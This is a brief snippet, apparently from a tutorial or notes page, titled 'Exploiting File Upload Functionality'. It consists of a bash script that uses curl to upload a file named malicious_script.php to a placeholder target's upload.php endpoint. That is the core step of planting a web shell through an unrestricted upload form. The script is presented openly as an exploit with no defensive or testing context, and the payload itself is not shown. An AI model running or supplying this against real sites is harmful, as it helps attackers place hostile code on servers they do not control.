## Exploiting File Upload Functionality

Bash script to exploit file upload functionality:

```bash
#!/bin/bash

# Set the target URL
target_url="http://target-website.com/upload.php"

# Specify the file to upload
file_to_upload="malicious_script.php"

# Craft the POST request
curl -F "file=@$file_to_upload" $target_url
